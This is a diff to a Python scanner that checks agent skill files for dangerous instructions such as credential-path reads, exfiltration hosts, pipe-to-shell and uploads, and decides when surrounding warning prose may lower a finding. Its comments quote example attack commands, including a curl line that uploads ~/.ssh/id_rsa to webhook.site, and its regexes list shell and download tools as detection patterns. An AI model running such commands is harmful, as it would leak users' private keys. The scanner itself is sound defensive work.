@@ -245,8 +245,10 @@ def looks_real_secret(s):
     return True
 
 
-# Hardening batch 2 (review R1): a guarded match is kept as a "Warning or example text" record, never dropped, and the guard is
-# narrow. For these rules a backtick or a leading | is code to run, not a quotation.
+# Hardening batch 2 (review R1; guard redesign after fix round 3): a guarded match is kept as a "Warning or example text" record,
+# never dropped. For the dangerous rules below (credential path, exfiltration host, pipe-to-shell, upload) a guard can only lower
+# the match to medium, and vet never says Install over it. Only prose outside the command vouches for it: text in a code span or
+# a command's arguments is never read, and any doubt (a cap, an unclosed backtick, shell text in the prose) means no guard.
 GUARD_CODE_RULES = frozenset(("WT-T004", "WT-T005", "WT-T006", "WT-T017"))
 GUARD_FUNCTION = frozenset("a an the any your my its this that it them to from into as of or nor ever just blindly".split())
 CLAUSE_END = re.compile(r"\.\s|\n|[:;!?](?=\s|$)|\s[-–—]{1,2}\s")
@@ -275,8 +277,8 @@ def _guard_token(t):
 
 def _negated(clause, rules):
     """The nearest governing word (a negation, an example word, a describer) governs the verb: reached walking back through at
-    most 3 filler words (run, read, send, data, keys...); function words (the, to, ever...) are free. A comma ends the clause
-    unless it follows the governing word ("Never, ever run") or a filler verb ("never read, send or upload")."""
+    most 3 filler words (run, read, send, data, keys, a masked code span...); function words (the, to, ever...) are free. A comma
+    ends the clause unless it follows the governing word ("Never, ever run") or a filler verb ("never read, send or upload")."""
     toks = [t for t in (_guard_token(x) for x in GUARD_TOKEN.findall(clause)) if t]
     gov, verbs, nouns = rules["context_guard"], rules["guard_filler"]["verbs"], rules["guard_filler"]["nouns"]
     n = 0
@@ -290,7 +292,7 @@ def _negated(clause, rules):
             return True
         elif t in GUARD_FUNCTION:
             continue
-        elif verbs.match(t) or nouns.match(t):
+        elif verbs.match(t) or nouns.match(t) or t == CODE:
             n += 1
             if n > 3:
                 return False
@@ -299,136 +301,264 @@ def _negated(clause, rules):
     return False
 
 
-SHELL_BEFORE = re.compile(r"(?i)(^|[\s;&|`(])(-c|eval|exec|sh|bash|zsh|dash|sudo|xargs|env|nohup|time|then|do|run|runs|execute|executes)\s*$")
-SHELL_SEP = re.compile(r";|&&|\|\||\$\(|`|\.\s|[!?](\s|$)")
-SENTENCE_END = re.compile(r"[.!?](\s|$)")
-SHELL_ARG = re.compile(r"""-{1,2}[A-Za-z0-9]|['"|<>\\]|\S*(://|[/@=$~])""")
+LINE_CAP, SPAN_CAP, ARGS_CAP, CLAUSE_CAP, AFTER_CAP, TOKEN_CAP, NEST_CAP, LIST_CAP = 4000, 300, 300, 300, 200, 200, 3, 200
+CODE = "\x01"                                    # a masked code span: one filler noun in the prose around it
+SENTENCE_END = re.compile(r"[.!?](?=\s|$)")      # quote-unaware: a quote never hides a sentence end (the 5" of 5"-wide)
+COMMAND = re.compile(r"(?i)\b(curl|wget)\b")
+SHELLY = re.compile(r"\||&&|(?:^|\s)&(?:\s|$)|\$[({]|[<>]\(|`|(?:^|\s)#|(?:^|\s)-{1,2}[A-Za-z0-9]|=@|(?:^|\s)@\S|\\\s*$|;(?=\S)"
+                    r"|(?i:\b(?:curl|wget)\b)")
+SHELL_WORD = re.compile(r"(?i)(?:^|\s)(?:-c|eval|exec|sh|bash|zsh|dash|sudo|xargs|env|nohup|time|then|do|run|runs|execute|executes)\s*$")
+LONG_TOKEN = re.compile(r"\S{%d,}" % (TOKEN_CAP + 1))
+HEADING = re.compile(r"^ {0,3}#{1,6}[ \t]+")      # a Markdown heading marker at the line start: never a shell comment
+AFTER_SEP = re.compile(r"(?i)(?:[ \t]*[;:]|[ \t]+[-–—]{1,2})[ \t]+(?P<phrase>(?:don'?t|do\s+not|never)\s+(?:follow|obey)\s+"
+                       r"(?:it|this|them|that|these|those)|treat\s+(?:it|this|them|that|these|those)\s+as\s+(?:untrusted\s+)?data|"
+                       r"(?:it|this|that)\s+is\s+(?:an?\s+)?(?:attack|injection|prompt[- ]injection))[ \t]*(?:[.!](?=\s|$)|$)")
 
 
-def _unquoted(rx, text, i, j):
-    """Where rx first matches in text[i:j] outside shell quoting and escapes, or -1. Fix round 2 (R1): the ; in a quoted
-    'Cookie: a=b;c=d' is part of one argument, not a separator. A quote opens only at the start of a word (an apostrophe in
-    "it's" never hides a separator); inside "...", $( and ` still start another command."""
-    q, k = None, i
-    while k < j:
-        c = text[k]
-        if q == "'":
-            q = None if c == "'" else q
-        elif c == "\\":
-            k += 2
+def _spans(line):
+    """The closed inline code spans on a line as (start, end, backtick run length); None when a backtick run never closes."""
+    out, op = [], None
+    for r in re.finditer(r"`+", line):
+        if op is None:
+            op = r
+        elif len(r.group()) == len(op.group()):
+            out.append((op.start(), r.end(), len(op.group())))
+            op = None
+    return None if op is not None else out
+
+
+def _span_ok(s):
+    """A code span that is one well-formed command: strict shell quoting in one pass with an explicit stack, no separator, no
+    comment, no nested backtick, nesting at most NEST_CAP deep."""
+    if len(s) > SPAN_CAP:
+        return False
+    st, i = [], 0
+    while i < len(s):
+        c, top = s[i], (st[-1] if st else "")
+        if c == "\\":
+            i += 2
             continue
-        elif q == '"':
+        if top == '"':
             if c == '"':
-                q = None
-            elif text.startswith(("$(", "`"), k):
-                return k
-        elif c in "'\"" and (k == i or text[k - 1] in " \t=@:(-"):
-            q = c
-        elif rx.match(text, k, j):
-            return k
-        k += 1
-    return -1
+                st.pop()
+            elif s.startswith("$(", i):
+                st.append("(")
+                i += 1
+            elif c == "`":
+                return False
+        elif c == "'":
+            j = s.find("'", i + 1)
+            if j == -1:
+                return False
+            i = j + 1
+            continue
+        elif c in '"(':
+            st.append(c)
+        elif c == ")":
+            if top != "(":
+                return False
+            st.pop()
+        elif c in ";`" or s.startswith(("||", "&&"), i):
+            return False
+        elif c == "&" and not (i and s[i - 1] in "<>") and not s.startswith("&>", i):
+            return False
+        elif c == "#" and (i == 0 or s[i - 1].isspace()):
+            return False
+        if len(st) > NEST_CAP:
+            return False
+        i += 1
+    return not st
 
 
-def _args_end(text, i):
-    """Fix round 2 (R1): where the shell arguments after a command match end. A flag, a quoted string, a path, a URL or a pipe
-    right after it starts them, and they run to the end of the line (through \\ continuations) or an unquoted sentence end:
-    "curl ... -H 'X-Note: this is an attack'" never describes itself. Prose right after it ("... | bash is an attack") is not one."""
-    if i >= len(text) or re.match(r"[.,:;!?)\]](\s|$)", text[i:i + 2]):
-        return i
-    k = i
-    while k < len(text) and text[k] in " \t":
-        k += 1
-    mid = k == i and i > 0 and not text[i - 1].isspace()   # the match ends inside an argument: webhook.site|/x, id_rsa|'
-    if not mid and not (k < len(text) and SHELL_ARG.match(text, k)):
-        return i
-    while True:
-        b = text.find("\n", k)
-        b = len(text) if b == -1 else b
-        s = _unquoted(SENTENCE_END, text, k, b)
-        if s != -1:
-            return s
-        if not text[k:b].rstrip().endswith("\\") or b == len(text):
-            return b
-        k = b + 1
-
-
-def _shell_quote(tail):
-    """Fix round 1 (R1): a quote or parenthesis that the shell runs is not a quotation: $( ), <( ), a subshell at the start of
-    a clause or after a run word, bash -c "...", eval '...'."""
-    if tail[-1] == "(" and tail[:-1].endswith(("$", "<", ">", "=")):
+def _args_ok(s, word, n):
+    """The bare arguments `s` between curl/wget and the match: no separator, substitution, comment or prose punctuation. A quote
+    opens only at a word start or right after a closing quote, so it's and users' are literal. A quote still open at the match
+    is fine only when its argument is one word ('key=@~/.ssh/id_rsa') with no escape or substitution and the quote closes after
+    the match: `word` is the match's word from the match on, `n` the match's length."""
+    if len(s) > ARGS_CAP or CODE in s:
+        return False
+    q, qs, closed, i = "", 0, -1, 0
+    while i < len(s):
+        c = s[i]
+        if q:
+            if c == q:
+                q, closed = "", i + 1
+            elif c == "\\" and q == '"':
+                i += 1
+        elif c == "\\":
+            i += 1
+        elif c in "'\"":
+            if i == 0 or s[i - 1] in " \t=" or closed == i:
+                q, qs = c, i
+        elif c in ";|`" or s.startswith(("$(", "<(", ">("), i):
+            return False
+        elif c == "&" and not (i and s[i - 1] in "<>"):
+            return False
+        elif c == "#" and (i == 0 or s[i - 1].isspace()):
+            return False
+        elif c in ",:" and i + 1 < len(s) and s[i + 1].isspace():
+            return False
+        i += 1
+    if not q:
         return True
-    pre = tail[:-1].rstrip(" \t")
-    return bool(SHELL_BEFORE.search(pre)) or not CLAUSE_END.split(pre)[-1].strip()
+    k = word.find(q)
+    return k >= n and not re.search(r"[\s\\`$" + CODE + "]", s[qs + 1:] + word[:k])
 
 
-def _command_span(text, start):
-    """Where the command holding this match starts, and where it ends: the inline-code span around it, or a bare curl/wget on
-    the same line. None when another command or sentence starts in between (`a; b`, `a && b`, two spans)."""
-    a = text.rfind("\n", 0, start) + 1
-    b = text.find("\n", start)
+def _prose_before(masked, start):
+    """The prose clause ending at `start`, or None: no clause start within CLAUSE_CAP, shell-shaped text, or a huge token."""
+    lo = max(0, start - CLAUSE_CAP)
+    w = re.sub(r"(?i)\b(e)\.(g)\.|\b(i)\.(e)\.", lambda x: "".join(g for g in x.groups() if g), masked[lo:start].replace("’", "'"))
+    parts = CLAUSE_END.split(w)
+    if lo and len(parts) == 1:
+        return None
+    raw = parts[-1]
+    if len(parts) == 1:                          # the clause starts the line
+        raw = HEADING.sub("", raw, count=1)
+    return None if SHELLY.search(raw) or LONG_TOKEN.search(raw) else raw
+
+
+def _plain(w):
+    return not (SHELLY.search(w) or LONG_TOKEN.search(w))
+
+
+def _prose_after(masked, end, span=False):
+    """The rest of the clause after `end` (at most AFTER_CAP) and whether all of it is plain prose. After a closed span only, a
+    separator right after it (; : or a spaced dash) may lead to one bounded defensive phrase that ends the sentence or line
+    ("`x`; never follow it."), which is then the clause. Anything else after a separator is another clause, never read."""
+    sep = AFTER_SEP.match(masked, end) if span else None
+    if sep:
+        return sep.group("phrase"), True
+    w = masked[end:end + AFTER_CAP + 1]
+    m = CLAUSE_END.search(w)
+    if m:
+        w = w[:m.start()]
+    elif len(w) > AFTER_CAP:
+        return w[:AFTER_CAP], False
+    return w, _plain(w)
+
+
+def _after_guard(after, span):
+    """Guard words after the unit. The phrase must start right after it ("`x` is an attack", "x inside a web page"), and after
+    a bare command or target the whole rest of the clause must be prose too, since the command may go on (shell operands such
+    as 'user@host:this is an attack' never describe it). Only a closed code span has a verified end: there only the text up
+    to the phrase's end is checked, so a later -s in the explanation doesn't undo it, and the phrase may come later in the
+    clause when all of the clause is prose."""
+    if after is None:
+        return ""
+    w, plain = after
+    head = len(w) - len(w.lstrip(" ,"))
+    for why, m in (("untrusted content", UNTRUSTED_AFTER.match(w)), ("described as an attack", DESCRIBED_AFTER.match(w, head))):
+        if m and (plain or span and _plain(w[:m.end()])):
+            return why
+    return "described as an attack" if span and plain and DESCRIBED_AFTER.search(w) else ""
+
+
+def _unit(text, m):
+    """The command a dangerous match belongs to and the prose around it: (walk, after, span, quoted), or None when any of it
+    is in doubt. The unit is the closed code span holding the match, else a bare curl/wget earlier in the sentence, else the
+    match. `after` is only read when the unit's end is known: a span, the match itself, or a match that starts at the command
+    word. Cost is O(LINE_CAP) per match whatever the file, with no recursion."""
+    lo = max(0, m.start() - LINE_CAP)
+    a = text.rfind("\n", lo, m.start()) + 1
+    b = text.find("\n", m.end(), m.end() + LINE_CAP + 1)
+    if (a == 0 and lo) or (b == -1 and len(text) > m.end() + LINE_CAP):
+        return None
     b = len(text) if b == -1 else b
-    seg = text[a:start]
-    if seg.count("`") % 2:
-        s = a + seg.rfind("`") + 1
-        e = text.find("`", start, b)
-        e = b if e == -1 else e + 1
-    else:
-        cm = list(re.finditer(r"(?i)\b(curl|wget)\b", seg))
-        if not cm:
+    if b - a > LINE_CAP:
+        return None
+    line = text[a:b]
+    sp = _spans(line)
+    if sp is None:
+        return None
+    ml = list(line)
+    for x0, x1, _ in sp:
+        ml[x0:x1] = CODE * (x1 - x0)
+    masked, s, e = "".join(ml), m.start() - a, m.end() - a
+    touch = [x for x in sp if x[0] < e and s < x[1]]
+    if touch:
+        x0, x1, k = touch[0]
+        if len(touch) > 1 or s < x0 + k or e > x1 - k or not _span_ok(line[x0 + k:x1 - k]):
             return None
-        s = a + cm[-1].start()
-        e = _unquoted(SHELL_SEP, text, start, b)
-        e = b if e == -1 else e
-    return None if _unquoted(SHELL_SEP, text, s, start) != -1 else (s, e)
+        start, end, span = x0, x1, True
+    else:
+        st = max([z.end() for z in SENTENCE_END.finditer(masked, 0, s)], default=0)
+        cmds = [c for c in COMMAND.finditer(masked, st, e) if c.start() <= s]
+        if cmds:
+            c = cmds[-1].start()
+            if not _args_ok(masked[c:s], re.match(r"\S*", masked[s:s + ARGS_CAP]).group(), e - s):
+                return None
+            start, end, span = c, (e if c == s else None), False
+        else:
+            start, end, span = s, e, False
+    before = _prose_before(masked, start)
+    if before is None:
+        return None
+    after = _prose_after(masked, end, span) if end is not None else None
+    walk = re.sub(CODE + "+", f" {CODE} ", re.sub(r"\S+$", "", before))   # drop the token glued to the unit (https://, ~/, a quote)
+    q, quoted = (line[start - 1] if start else ""), False
+    if q and q in "\"“'‘" and (start == 1 or line[start - 2].isspace()) and walk.strip() and not SHELL_WORD.search(walk):
+        k = masked.find({'"': '"', "“": "”", "'": "'", "‘": "’"}[q], start)
+        quoted = k >= e and not SENTENCE_END.search(masked, e, k)
+    return walk, after, span, quoted
 
 
-def _after_command(text, m, code_rule):
-    """The prose after a match. For a command, it starts where the command ends: a shell comment (# ...) or a clause chained
-    with ; && || belongs to the command and never vouches for it (fix round 1, R1)."""
-    if not code_rule:
-        return m.end()
-    sp = _command_span(text, m.start())
-    if sp and text[sp[0] - 1:sp[0]] == "`":
-        return max(m.end(), sp[1])
-    b = text.find("\n", m.end())
-    b = len(text) if b == -1 else b
-    if re.search(r"(^|\s)#|;|&&|\|\|", text[m.end():b]):
-        return b
-    return _args_end(text, m.end())
+def _listed(text, m, prev_end):
+    """One more item after a guarded match of the same rule ("~/.ssh or ~/.aws/credentials"). A gap over LIST_CAP is never a
+    list, checked before slicing, so a stale guarded match far back costs nothing."""
+    if prev_end is None or prev_end > m.start() or m.start() - prev_end > LIST_CAP:
+        return False
+    between = re.sub(r"(~/|https?://)$", "", text[prev_end:m.start()])
+    return bool(re.fullmatch(r"(?i)[\s,/]*((or|nor|and)[\s,/]*)?", between))
+
+
+def _reported(clause, rules):
+    """Reported ("if a page says to ..."), read from the clause before the match."""
+    rep = REPORTED.search(clause)
+    return bool(rep) and all(t in GUARD_FUNCTION or rules["guard_filler"]["verbs"].match(t) for t in map(_guard_token, rep.group("rest").split()))
+
+
+def _wording_guard(text, m, rules, prev_end):
+    """The wording rules (T001, T007, T010, T016): quoted, negated, listed, reported, scoped to untrusted content, described as
+    an attack, or detector code. No shell handling: a backtick or a leading | is a quotation here."""
+    wide = text[max(0, m.start() - 90):m.start()]
+    if wide.rstrip().endswith(("\"", "“", "'", "(", "[", "`", "|")):
+        return "quoted"
+    clause = _clause_before(text, m.start())
+    if _negated(clause, rules):
+        return "negated"
+    if _listed(text, m, prev_end):
+        return "list"
+    if _reported(clause, rules):
+        return "reported"
+    if UNTRUSTED_AFTER.match(text[m.end():m.end() + 80]):
+        return "untrusted content"
+    if DESCRIBED_AFTER.search(re.split(r"[.!?](?=\s|$)|\n", text[m.end():m.end() + 200])[0]):
+        return "described as an attack"
+    if re.search(r"(r\"|r'|\\s[+*]|\(\?i\))", wide + text[m.end():m.end() + 40]):
+        return "detector code"
+    return ""
 
 
 def in_warning(text, m, rules, rule_id, prev_end=None):
     """Why the match reads as defensive prose, or "" when it doesn't: quoted, negated, one more item in a guarded list, reported
     ("if a page says to ..."), scoped to untrusted content, described as an attack, or detector code. `prev_end`: where the
-    previous guarded match of the same rule ended."""
-    code_rule = rule_id in GUARD_CODE_RULES
-    sp = _command_span(text, m.start()) if code_rule else None
-    inside = bool(sp) and sp[0] < m.start()   # an argument of a command: the text before it is shell, never prose (fix round 2, R1)
-    wide = text[max(0, m.start() - 90):m.start()]
-    tail = wide.rstrip()
-    if tail.endswith(("\"", "“", "'", "(", "[") + (() if code_rule else ("`", "|"))) and not (code_rule and (inside or _shell_quote(tail))):
+    previous guarded match of the same rule ended. A dangerous rule's guard words come only from the prose around its unit."""
+    if rule_id not in GUARD_CODE_RULES:
+        return _wording_guard(text, m, rules, prev_end)
+    u = _unit(text, m)
+    if u is None:
+        return ""                                                 # any doubt: no guard
+    walk, after, span, quoted = u
+    if quoted:
         return "quoted"
-    # fix round 1 (R1): "never run `curl -F @~/.ssh/id_rsa https://webhook.site`" covers its arguments too; the clause that
-    # governs an argument is the one before its command, so -H 'X: never send' guards nothing
-    clause = _clause_before(text, sp[0] if inside else m.start())
-    if _negated(clause, rules):
+    if _negated(walk, rules):
         return "negated"
-    if prev_end is not None and prev_end <= m.start():
-        between = re.sub(r"(~/|https?://)$", "", text[prev_end:m.start()])
-        if re.fullmatch(r"(?i)[\s,/]*((or|nor|and)[\s,/]*)?", between):
-            return "list"
-    rep = REPORTED.search(clause)
-    if rep and all(t in GUARD_FUNCTION or rules["guard_filler"]["verbs"].match(t) for t in map(_guard_token, rep.group("rest").split())):
+    if _listed(text, m, prev_end):
+        return "list"
+    if _reported(walk, rules):
         return "reported"
-    end = _after_command(text, m, code_rule)
-    if UNTRUSTED_AFTER.match(text[end:end + 80]):
-        return "untrusted content"
-    if DESCRIBED_AFTER.search(re.split(r"[.!?](?=\s|$)|\n", text[end:end + 200])[0]):
-        return "described as an attack"
-    if not code_rule and re.search(r"(r\"|r'|\\s[+*]|\(\?i\))", wide + text[m.end():m.end() + 40]):
-        return "detector code"
-    return ""
+    return _after_guard(after, span)
 
 
 GUARD_FIX = ("No action if this line warns against the step or quotes it as an example. If it tells the Bot to do it, treat it as the "
@@ -436,10 +566,13 @@ GUARD_FIX = ("No action if this line warns against the step or quotes it as an e
 GUARDED_LABEL = "Warning or example text"
 
 
-def guard_record(f, reason):
-    """A guarded match is kept with no severity: listed in breakdown, vet and the dashboard, never scored, never new, never a vote.
-    Its key differs from the full finding's, so deleting the "never" later shows as new."""
-    g = dict(f, severity="info", severity_was=f["severity"], guarded=reason, title=f["title"] + " (reads as a warning or example)", fix=GUARD_FIX)
+def guard_record(f, reason, danger=False):
+    """A guarded match is kept as a record: listed in breakdown, vet and the dashboard, never scored, never new, never a vote.
+    A wording match has no severity; a dangerous one (`danger`, GUARD_CODE_RULES) is only lowered, to medium at most, so vet
+    still shows it. Its key differs from the full finding's, so deleting the "never" later shows as new."""
+    sev = f["severity"]
+    low = (sev if SEV_ORDER.index(sev) >= SEV_ORDER.index("medium") else "medium") if danger else "info"
+    g = dict(f, severity=low, severity_was=sev, guarded=reason, title=f["title"] + " (reads as a warning or example)", fix=GUARD_FIX)
     g["key"] = hashlib.sha1((f["key"] + "|guarded").encode()).hexdigest()[:16]
     g.pop("key0", None)
     return g
@@ -539,7 +672,7 @@ def scan_text(text, where, rules, kind="skill"):
                 f = finding(rule["id"], rule["title"], rule["severity"], rule["owasp"], f"{where}:{line_of(text, m.start())}", ev, rule["fix"])
             reason = in_warning(text, m, rules, rule["id"], prev_end) if rule["id"] in guarded else ""
             if reason:   # batch 2 (R1): downgraded to a record, never dropped
-                f, prev_end = guard_record(f, reason), m.end()
+                f, prev_end = guard_record(f, reason, danger=rule["id"] in GUARD_CODE_RULES), m.end()
             out.append(f)
             if rule["id"] in ("WT-T002",):
                 break  # one per file is enough for invisible chars
@@ -996,8 +1129,8 @@ def label_findings(findings, covered=None):
     out = []
     for f in findings:
         f = dict(f)
-        if f.get("guarded"):   # batch 2 (R1): defensive wording, kept as a record with no severity
-            _no_severity(f, "guarded", GUARDED_LABEL)
+        if f.get("guarded"):   # batch 2 (R1): defensive wording, kept as a record with no severity; severity_was stays the rule's own
+            f["class"], f["label"], f["severity"] = "guarded", GUARDED_LABEL, "info"
         elif (f["rule"] in TIP_RULES or f["rule"] in SCOPE_RULES or f.get("fact_only") or covered_by_ask_first(f, covered)
                 or plain_cookie_jar(f)):
             _no_severity(f, "tip", TIP)
@@ -1191,11 +1324,17 @@ def status_line(snap):
     return f"{st} — {n} confirmed {sev} problem{'' if n == 1 else 's'}" if n else st
 
 
+def warned_danger(f):
+    """A credential path, exfiltration host, pipe-to-shell or upload that a guard lowered: vet never says Install over it and
+    revet never re-approves because of it."""
+    return bool(f.get("guarded")) and f["rule"] in GUARD_CODE_RULES and f.get("severity_was") in ("critical", "high")
+
+
 def verdict(findings):
     sev = {f["severity"] for f in findings}
     if "critical" in sev:
         return "Do not install"
-    if "high" in sev:
+    if "high" in sev or any(warned_danger(f) for f in findings):
         return "Install with changes"
     return "Install"
 
@@ -7551,7 +7690,7 @@ def revet(dirs, approve=False):
             r.update(result="not finished", why="the scanners didn't finish in time; it stays open and is retried next run")
         else:
             fs = dedupe(per[d] + [f for f in eng if os.path.normpath(f["where"]) == d])
-            bad = [f for f in active(fs)[0] if f["severity"] in ("critical", "high")]
+            bad = [f for f in active(fs)[0] if f["severity"] in ("critical", "high") or warned_danger(f)]
             if bad:
                 r.update(result="flagged", why="; ".join(sorted({plain(f)["title"] if f["rule"].startswith("WT-X") else f["title"] for f in bad}))[:200])
             else:
